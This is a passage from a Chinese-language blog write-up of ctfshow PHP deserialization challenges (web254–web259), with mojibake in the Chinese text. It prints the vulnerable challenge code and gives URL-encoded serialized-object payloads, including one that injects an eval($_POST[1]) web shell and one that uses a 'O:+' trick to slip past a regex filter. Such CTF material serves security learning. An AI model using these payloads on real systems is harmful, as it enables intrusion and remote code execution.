<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>ctfshowååºåˆ—åŒ– | Xinyuan's blog</title><meta name="keywords" content="wp"><meta name="author" content="é‘«ç¼˜,xy_404@163.com"><meta name="copyright" content="é‘«ç¼˜"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="ctfshowååºåˆ—åŒ–web25412345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?phperror_reporting(0);highlight_file(__FILE__);include(&amp;#x27;flag.php&amp;#x27;);class ctfShowUser&amp;#123;">
<meta property="og:type" content="article">
<meta property="og:title" content="ctfshowååºåˆ—åŒ–">
<meta property="og:url" content="http://websec.space/2022/03/12/ctfshow%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
<meta property="og:site_name" content="Xinyuan&#39;s blog">
<meta property="og:description" content="ctfshowååºåˆ—åŒ–web25412345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?phperror_reporting(0);highlight_file(__FILE__);include(&amp;#x27;flag.php&amp;#x27;);class ctfShowUser&amp;#123;">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://img-blog.csdnimg.cn/9164d2cb2f204f6cba75611a0dc18c68.png">
<meta property="article:published_time" content="2022-03-11T16:00:00.000Z">
<meta property="article:modified_time" content="2022-03-12T08:36:29.971Z">
<meta property="article:author" content="é‘«ç¼˜">
<meta property="article:tag" content="wp">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://img-blog.csdnimg.cn/9164d2cb2f204f6cba75611a0dc18c68.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://websec.space/2022/03/12/ctfshow%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'å¤åˆ¶æˆåŠŸ',
    error: 'å¤åˆ¶é”™è¯¯',
    noSupport: 'æµè§ˆå™¨ä¸æ”¯æŒ'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: 'å¤©',
  date_suffix: {
    just: 'åˆšåˆš',
    min: 'åˆ†é’Ÿå‰',
    hour: 'å°æ—¶å‰',
    day: 'å¤©å‰',
    month: 'ä¸ªæœˆå‰'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: true,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'ctfshowååºåˆ—åŒ–',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-03-12 16:36:29'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Xinyuan's blog" type="application/atom+xml">
</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/1.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">æ–‡ç« </div><div class="length-num">38</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">æ ‡ç­¾</div><div class="length-num">6</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">åˆ†ç±»</div><div class="length-num">6</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> é¦–é¡µ</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> æ—¶é—´è½´</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> æ ‡ç­¾</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> åˆ†ç±»</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> æ¸…å•</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> ç…§ç‰‡</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> è§†é¢‘</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> å‹é“¾</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> å…³äº</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://img-blog.csdnimg.cn/9164d2cb2f204f6cba75611a0dc18c68.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Xinyuan's blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> é¦–é¡µ</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> æ—¶é—´è½´</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> æ ‡ç­¾</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> åˆ†ç±»</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> æ¸…å•</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> ç…§ç‰‡</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> è§†é¢‘</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> å‹é“¾</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> å…³äº</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">ctfshowååºåˆ—åŒ–</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">å‘è¡¨äº</span><time class="post-meta-date-created" datetime="2022-03-11T16:00:00.000Z" title="å‘è¡¨äº 2022-03-12 00:00:00">2022-03-12</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">æ›´æ–°äº</span><time class="post-meta-date-updated" datetime="2022-03-12T08:36:29.971Z" title="æ›´æ–°äº 2022-03-12 16:36:29">2022-03-12</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/wp/">wp</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="ctfshowååºåˆ—åŒ–"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">é˜…è¯»é‡:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="ctfshowååºåˆ—åŒ–"><a href="#ctfshowååºåˆ—åŒ–" class="headerlink" title="ctfshowååºåˆ—åŒ–"></a>ctfshowååºåˆ—åŒ–</h1><h2 id="web254"><a href="#web254" class="headerlink" title="web254"></a>web254</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&#x27;flag.php&#x27;);</span><br><span class="line"></span><br><span class="line">class ctfShowUser&#123;</span><br><span class="line">    public $username=&#x27;xxxxxx&#x27;;</span><br><span class="line">    public $password=&#x27;xxxxxx&#x27;;</span><br><span class="line">    public $isVip=false;</span><br><span class="line"></span><br><span class="line">    public function checkVip()&#123;</span><br><span class="line">        return $this-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    public function login($u,$p)&#123;</span><br><span class="line">        if($this-&gt;username===$u&amp;&amp;$this-&gt;password===$p)&#123;</span><br><span class="line">            $this-&gt;isVip=true;</span><br><span class="line">        &#125;</span><br><span class="line">        return $this-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    public function vipOneKeyGetFlag()&#123;</span><br><span class="line">        if($this-&gt;isVip)&#123;</span><br><span class="line">            global $flag;</span><br><span class="line">            echo &quot;your flag is &quot;.$flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;no vip, no flag&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username=$_GET[&#x27;username&#x27;];</span><br><span class="line">$password=$_GET[&#x27;password&#x27;];</span><br><span class="line"></span><br><span class="line">if(isset($username) &amp;&amp; isset($password))&#123;</span><br><span class="line">    $user = new ctfShowUser();</span><br><span class="line">    if($user-&gt;login($username,$password))&#123;</span><br><span class="line">        if($user-&gt;checkVip())&#123;</span><br><span class="line">            $user-&gt;vipOneKeyGetFlag();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &quot;no vip,no flag&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¯»æ‡‚ä»£ç æ„æ€å³å¯æ¯”è¾ƒç®€å•</p>
<p>expï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=xxxxxx&amp;passowrd=xxxxxx</span><br></pre></td></tr></table></figure>

<h2 id="web255"><a href="#web255" class="headerlink" title="web255"></a>web255</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&#x27;flag.php&#x27;);</span><br><span class="line"></span><br><span class="line">class ctfShowUser&#123;</span><br><span class="line">    public $username=&#x27;xxxxxx&#x27;;</span><br><span class="line">    public $password=&#x27;xxxxxx&#x27;;</span><br><span class="line">    public $isVip=false;</span><br><span class="line"></span><br><span class="line">    public function checkVip()&#123;</span><br><span class="line">        return $this-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    public function login($u,$p)&#123;</span><br><span class="line">        return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p;</span><br><span class="line">    &#125;</span><br><span class="line">    public function vipOneKeyGetFlag()&#123;</span><br><span class="line">        if($this-&gt;isVip)&#123;</span><br><span class="line">            global $flag;</span><br><span class="line">            echo &quot;your flag is &quot;.$flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;no vip, no flag&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username=$_GET[&#x27;username&#x27;];</span><br><span class="line">$password=$_GET[&#x27;password&#x27;];</span><br><span class="line"></span><br><span class="line">if(isset($username) &amp;&amp; isset($password))&#123;</span><br><span class="line">    $user = unserialize($_COOKIE[&#x27;user&#x27;]);    </span><br><span class="line">    if($user-&gt;login($username,$password))&#123;</span><br><span class="line">        if($user-&gt;checkVip())&#123;</span><br><span class="line">            $user-&gt;vipOneKeyGetFlag();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &quot;no vip,no flag&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>åºåˆ—åŒ–ä¸‹é¢ä¸€æ®µä»£ç ï¼Œå³åºåˆ—åŒ–ä¸€æ®µå†…å®¹å°†$isVip=true</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</span><br></pre></td></tr></table></figure>

<p>è¿˜è¦è®¾ç½®ä¸€ä¸‹usernameå’Œpassword</p>
<h2 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&#x27;flag.php&#x27;);</span><br><span class="line"></span><br><span class="line">class ctfShowUser&#123;</span><br><span class="line">    public $username=&#x27;xxxxxx&#x27;;</span><br><span class="line">    public $password=&#x27;xxxxxx&#x27;;</span><br><span class="line">    public $isVip=false;</span><br><span class="line"></span><br><span class="line">    public function checkVip()&#123;</span><br><span class="line">        return $this-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    public function login($u,$p)&#123;</span><br><span class="line">        return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p;</span><br><span class="line">    &#125;</span><br><span class="line">    public function vipOneKeyGetFlag()&#123;</span><br><span class="line">        if($this-&gt;isVip)&#123;</span><br><span class="line">            global $flag;</span><br><span class="line">            if($this-&gt;username!==$this-&gt;password)&#123;</span><br><span class="line">                    echo &quot;your flag is &quot;.$flag;</span><br><span class="line">              &#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;no vip, no flag&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username=$_GET[&#x27;username&#x27;];</span><br><span class="line">$password=$_GET[&#x27;password&#x27;];</span><br><span class="line"></span><br><span class="line">if(isset($username) &amp;&amp; isset($password))&#123;</span><br><span class="line">    $user = unserialize($_COOKIE[&#x27;user&#x27;]);    </span><br><span class="line">    if($user-&gt;login($username,$password))&#123;</span><br><span class="line">        if($user-&gt;checkVip())&#123;</span><br><span class="line">            $user-&gt;vipOneKeyGetFlag();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &quot;no vip,no flag&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å¤šäº†ä¸€ä¸ªåˆ¤æ–­$this-&gt;username!==$this-&gt;password</p>
<p>åºåˆ—åŒ–çš„å¯¹è±¡</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A4%3A%22xxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</span><br></pre></td></tr></table></figure>

<p>expï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=xxxxxx&amp;password=xxxx</span><br></pre></td></tr></table></figure>

<h2 id="web257"><a href="#web257" class="headerlink" title="web257"></a>web257</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class ctfShowUser&#123;</span><br><span class="line">    private $username=&#x27;xxxxxx&#x27;;</span><br><span class="line">    private $password=&#x27;xxxxxx&#x27;;</span><br><span class="line">    private $isVip=false;</span><br><span class="line">    private $class = &#x27;info&#x27;;</span><br><span class="line"></span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;class=new info();</span><br><span class="line">    &#125;</span><br><span class="line">    public function login($u,$p)&#123;</span><br><span class="line">        return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        $this-&gt;class-&gt;getInfo();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class info&#123;</span><br><span class="line">    private $user=&#x27;xxxxxx&#x27;;</span><br><span class="line">    public function getInfo()&#123;</span><br><span class="line">        return $this-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class backDoor&#123;</span><br><span class="line">    private $code;</span><br><span class="line">    public function getInfo()&#123;</span><br><span class="line">        eval($this-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username=$_GET[&#x27;username&#x27;];</span><br><span class="line">$password=$_GET[&#x27;password&#x27;];</span><br><span class="line"></span><br><span class="line">if(isset($username) &amp;&amp; isset($password))&#123;</span><br><span class="line">    $user = unserialize($_COOKIE[&#x27;user&#x27;]);</span><br><span class="line">    $user-&gt;login($username,$password);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å°†æ„é€ å‡½æ•° new infoæ”¹ä¸ºbackDoor</p>
<p>ç„¶åå°†backDoorç±»ä¸­çš„codeæ”¹ä¸ºeval($_POST[1]);</p>
<p>åºåˆ—åŒ–åæˆåŠŸrce</p>
<h2 id="web258"><a href="#web258" class="headerlink" title="web258"></a>web258</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class ctfShowUser&#123;</span><br><span class="line">    public $username=&#x27;xxxxxx&#x27;;</span><br><span class="line">    public $password=&#x27;xxxxxx&#x27;;</span><br><span class="line">    public $isVip=false;</span><br><span class="line">    public $class = &#x27;info&#x27;;</span><br><span class="line"></span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;class=new info();</span><br><span class="line">    &#125;</span><br><span class="line">    public function login($u,$p)&#123;</span><br><span class="line">        return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        $this-&gt;class-&gt;getInfo();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class info&#123;</span><br><span class="line">    public $user=&#x27;xxxxxx&#x27;;</span><br><span class="line">    public function getInfo()&#123;</span><br><span class="line">        return $this-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class backDoor&#123;</span><br><span class="line">    public $code;</span><br><span class="line">    public function getInfo()&#123;</span><br><span class="line">        eval($this-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username=$_GET[&#x27;username&#x27;];</span><br><span class="line">$password=$_GET[&#x27;password&#x27;];</span><br><span class="line"></span><br><span class="line">if(isset($username) &amp;&amp; isset($password))&#123;</span><br><span class="line">    if(!preg_match(&#x27;/[oc]:\d+:/i&#x27;, $_COOKIE[&#x27;user&#x27;]))&#123;</span><br><span class="line">        $user = unserialize($_COOKIE[&#x27;user&#x27;]);</span><br><span class="line">    &#125;</span><br><span class="line">    $user-&gt;login($username,$password);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åŠ äº†è¿‡æ»¤ï¼Œæ‰€ä»¥å°†O:10: æ”¹æˆO:+10:å³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A%2B11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A0%3Bs%3A5%3A%22class%22%3BO%3A%2B8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A16%3A%22eval%28%24_POST%5B1%5D%29%3B%22%3B%7D%7D</span><br></pre></td></tr></table></figure>



<h2 id="web259-call"><a href="#web259-call" class="headerlink" title="web259(__call())"></a>web259(__call())</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">$vip = unserialize($_GET[&#x27;vip&#x27;]);</span><br><span class="line">//vip can get flag one key</span><br><span class="line">$vip-&gt;getFlag();</span><br></pre></td></tr></table></figure>

<blockquote>
<p>flag.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$xff = explode(&#x27;,&#x27;, $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;]);</span><br><span class="line">array_pop($xff);</span><br><span class="line">$ip = array_pop($xff);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if($ip!==&#x27;127.0.0.1&#x27;)&#123;</span><br><span class="line">	die(&#x27;error&#x27;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">	$token = $_POST[&#x27;token&#x27;];</span><br><span class="line">	if($token==&#x27;ctfshow&#x27;)&#123;</span><br><span class="line">		file_put_contents(&#x27;flag.txt&#x27;,$flag);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
